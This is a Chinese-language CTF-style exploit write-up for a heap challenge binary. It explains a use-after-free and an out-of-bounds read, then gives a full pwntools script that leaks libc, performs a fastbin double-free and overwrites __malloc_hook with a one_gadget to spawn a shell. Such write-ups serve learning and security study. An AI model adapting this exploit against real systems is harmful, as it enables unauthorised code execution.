# 漏洞利用文档

## 执行环境
基于exp代码和程序分析，执行环境如下：
- **程序类型**：ELF 64位可执行文件，使用动态链接的libc。
- **保护机制**：从exp利用过程推断，ASLR已启用（需要泄漏libc地址），但可能未启用PIE（全局数组地址固定）或栈保护（未观察到栈相关检查）。具体可通过`checksec ./data/sample13`验证，但用户未提供输出。
- **依赖库**：依赖系统libc，exp中通过`elf.libc`自动获取。
- **运行要求**：Linux环境，需安装pwntools等调试工具，程序路径为`./data/sample13`。
- **交互方式**：通过标准输入/输出进行菜单驱动交互，支持添加、显示、呼叫等操作。

## 漏洞成因
### 关键结构体
程序使用全局数组`unk_202060`（类型为`girl_info*[100]`）存储女孩信息指针，每个结构体定义如下：
```c
struct girl_info {
    char *name;       // 动态分配的名字字符串指针（偏移0）
    int name_size;    // 名字字符串大小（偏移8）
    char call[12];    // 固定呼叫字符串（偏移12）
};
```
全局变量`dword_20204C`记录当前女孩数量。

### 漏洞分析
1. **Use-After-Free (UAF) 漏洞**：
   - **位置**：函数`sub_DD6()`（对应菜单选项4，呼叫功能）中，代码`free(**((void ***)&unk_202060 + v2));`释放了女孩名字指针，但未将结构体中的`name`指针置空。
   - **成因**：释放后，全局数组中的指针仍保留。后续在`sub_CFC()`（菜单选项2，显示功能）中通过`puts(**((const char ***)&unk_202060 + v1));`使用已释放指针，导致UAF。攻击者可读取释放内存中的敏感数据（如libc地址）或控制内存内容实现代码执行。
   
2. **数组越界读漏洞**：
   - **位置**：函数`sub_CFC()`中，用户提供的索引`v1`通过`__isoc99_scanf("%d", &v1);`读取，但未检查范围（0-99）。
   - **成因**：直接使用`v1`访问全局数组，若索引越界，可读取数组外内存，导致信息泄漏或崩溃。但exp未利用此漏洞。

**根本原因**：内存管理不当，释放后未置空指针，且缺乏输入验证。

## 漏洞利用过程
利用过程通过UAF泄漏libc地址，结合双重释放（double-free）劫持fastbins链，最终覆盖`__malloc_hook`实现代码执行。以下表格总结了关键步骤的堆内存和全局数组变化：

| 步骤 | 操作 | 堆状态变化 | 全局数组状态 | 关键地址/数据 | 利用效果 |
|------|------|------------|--------------|---------------|----------|
| 1 | `add(0x80);add(0x60);add(0x60)` | 分配三个chunk：大小0x80（索引0）、0x60（索引1）、0x60（索引2） | 索引0-2指向有效结构体 | 名字指针：0x5c0437a4f030（索引0）等 | 初始化堆布局，为UAF做准备 |
| 2 | `call(0)` | 释放索引0的name chunk（0x5c0437a4f020）到unsorted bin，fd/bk指向main_arena+88（0x76fc02a8cb78） | 索引0指针仍指向已释放结构体 | 泄漏点：0x76fc02a8cb78 | UAF形成，可读取libc地址 |
| 3 | `show(0)` | 通过UAF读取释放的chunk，获得libc地址 | 无变化 | libc基址 = 泄漏地址 - (__malloc_hook+0x68) | 计算libc基址，为后续利用奠基 |
| 4 | `call(1);call(2);call(1)` | 释放索引1和2的name chunk（大小0x71），形成fastbins双重释放循环：0x5c0437a4f0d0 → 0x5c0437a4f160 → 0x5c0437a4f0d0 | 索引1和2指针指向fastbins中的chunk | 循环链表 | 准备fastbins劫持，实现任意地址写入 |
| 5 | `add(0x60, p64(__malloc_hook-0x23))` | 从fastbins分配chunk，写入目标地址__malloc_hook-0x23（0x76fc02a8caed），劫持fastbins链 | 新分配索引3 | 劫持地址：0x76fc02a8caed | fastbins链指向libc，为覆盖__malloc_hook做准备 |
| 6 | `add(0x60, payload)` | 在__malloc_hook附近（0x76fc02a8cafd）写入payload：11字节填充 + one_gadget地址 + realloc+2地址 | 新分配索引6 | one_gadget: 0x76fc027b9247, realloc+2: 0x76fc0274c712 | __malloc_hook被覆盖为realloc+2，但payload区域包含one_gadget |
| 7 | `add(0x60)`（触发malloc） | 从劫持的fastbins链分配内存，可能触发one_gadget执行 | 新分配索引7 | 触发控制流劫持 | 获得shell或代码执行 |
| 8 | `interactive()` | 程序进入交互模式，攻击者获得控制权 | 无变化 | shell启动 | 利用成功 |

**内存变化总结**：
- **堆布局**：从初始分配逐步演变为复杂状态，包括unsorted bin（含libc地址）和fastbins循环。
- **全局数组**：始终保留悬空指针，支撑UAF利用。
- **libc交互**：通过覆盖`__malloc_hook`附近内存，劫持malloc的控制流。

## Exploit
以下为漏洞利用脚本（exp），在关键位置添加注释说明：

```python
from pwn import *

# 设置调试环境和上下文
context.log_level = 'debug'  # 启用调试输出
context.terminal = ['tmux', 'splitw', '-h']  # 指定终端用于调试
p = process('./data/sample13')  # 启动目标程序
elf = ELF('./data/sample13')   # 加载ELF文件信息
libc = elf.libc  # 获取程序使用的libc

# 定义交互函数
def add(size, name="a", phone="b"):
    """添加女孩信息：分配指定大小的名字chunk，并设置名字和呼叫字符串"""
    p.sendlineafter("Input your choice:", "1")  # 选择添加选项
    p.sendlineafter("Please input the size of girl's name\n", str(size))  # 发送名字大小
    p.sendafter("please inpute her name:\n", name)  # 发送名字内容
    p.sendafter("please input her call:\n", phone)  # 发送呼叫字符串

def show(idx):
    """显示女孩信息：通过索引读取名字和呼叫字符串，用于UAF泄漏"""
    p.sendlineafter("Input your choice:", "2")  # 选择显示选项
    p.sendlineafter("Please input the index:\n", str(idx))  # 发送索引
    p.recvuntil("name:\n")  # 等待名字输出
    name = p.recvline()  # 读取名字
    p.recvuntil("phone:\n")  # 等待呼叫字符串输出
    phone = p.recvline()  # 读取呼叫字符串
    info("recv name:{}  phone:{}".format(name, phone))  # 打印调试信息
    return name, phone

def call(idx):
    """呼叫女孩：释放指定索引的名字chunk，触发UAF"""
    p.sendlineafter("Input your choice:", "4")  # 选择呼叫选项
    p.sendlineafter("Please input the index:\n", str(idx))  # 发送索引

# Step 1: 初始化堆布局，分配三个不同大小的chunk
# 目的：创建可释放的chunk，0x80大小用于进入unsorted bin泄漏libc，0x60大小用于fastbins操作
add(0x80);add(0x60);add(0x60)

# Step 2: 释放索引0的name chunk，形成UAF条件
# 原因：释放后指针未置空，后续show(0)可读取释放的内存
call(0)

# Step 3: 通过UAF读取释放的chunk，泄漏libc地址
# 过程：show(0)读取已释放chunk，其中包含main_arena+88的地址
name, _= show(0)
# 提取泄漏的地址：去除换行符并填充为8字节
leak_libc_addr = u64(name[:-1].ljust(8, b"\x00"))
# 计算libc基址：泄漏地址减去__malloc_hook的偏移（包括malloc_chunk头部和main_arena偏移）
libc_base_addr = leak_libc_addr - (libc.sym['__malloc_hook'] + 0x10 + 0x58)
libc.address = libc_base_addr  # 设置libc基址，便于后续地址计算
info("Leaked libc base: {}".format(hex(libc_base_addr)))  # 输出libc基址

# Step 4: 创建双重释放（double-free），形成fastbins循环链表
# 操作：释放索引1和2的chunk，然后再次释放索引1，导致fastbins中出现循环
call(1);call(2);call(1)

# Step 5: 劫持fastbins链，指向__malloc_hook附近
# 目的：通过分配操作将fastbins链指向libc中的目标地址
add(0x60, p64(libc.sym["__malloc_hook"] - 0x23))  # 写入__malloc_hook-0x23，绕过fastbins大小检查
add(0x60);add(0x60)  # 消耗fastbins中的其他chunk，使链指向目标地址

# Step 6: 在目标地址写入payload，覆盖__malloc_hook
# 构造payload：11字节填充 + one_gadget地址 + realloc+2地址
# 注意：__malloc_hook被覆盖为realloc+2，但分配时可能执行one_gadget
one_gadget = libc.address + 0xf1247  # 从libc基址计算one_gadget地址（具体偏移需根据libc版本调整）
payload = b'a' * 11 + p64(one_gadget) + p64(libc.sym['realloc']+2)  # 填充后覆盖__malloc_hook区域
add(0x60, payload)  # 分配chunk并写入payload

# Step 7: 触发malloc调用，执行one_gadget
# 原因：下一次malloc时，从劫持的fastbins链分配，可能触发控制流劫持
p.sendlineafter("Input your choice:", "1")  # 选择添加选项，触发malloc

# Step 8: 进入交互模式，获得shell或代码执行
p.interactive()  # 启动交互，攻击者控制程序
```

### 关键注释说明：
- **libc泄漏计算**：Step 3中，泄漏的地址是`main_arena+88`，通过减去`__malloc_hook`的偏移（包括chunk头0x10和main_arena内部偏移0x58）得到基址。
- **双重释放**：Step 4通过多次释放同一chunk，创建fastbins循环，为任意地址写入奠基。
- **fastbins劫持**：Step 5写入`__malloc_hook-0x23`以绕过fastbins大小检查（0x70大小），使后续分配在libc区域。
- **payload构造**：Step 6中，payload结构利用内存对齐，在`__malloc_hook`处写入realloc+2（调整栈帧），并在之前放置one_gadget地址以提高执行概率。
- **触发执行**：Step 7通过添加操作触发malloc，由于fastbins链被劫持，可能执行one_gadget获取shell。

此exp成功利用UAF和双重释放漏洞，实现在ASLR环境下获得代码执行。实际运行前，需确保libc版本匹配（one_gadget偏移可能需调整）。
